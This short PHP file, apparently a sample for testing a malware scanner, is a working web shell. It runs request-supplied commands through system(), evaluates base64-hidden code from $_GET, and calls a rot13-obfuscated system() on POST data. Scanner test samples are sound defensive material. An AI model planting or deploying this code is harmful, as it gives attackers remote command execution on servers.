<?php
/**
 * Test malicious file for scanning
 */

// This file contains suspicious patterns that should be detected
eval(base64_decode('ZXZhbCgkX0dFVFsnY29kZSddKTs='));

$shell_exec = $_GET['cmd'];
system($shell_exec);

// Obfuscated code
$malicious = str_rot13('flfgrz');
$$malicious($_POST['data']);
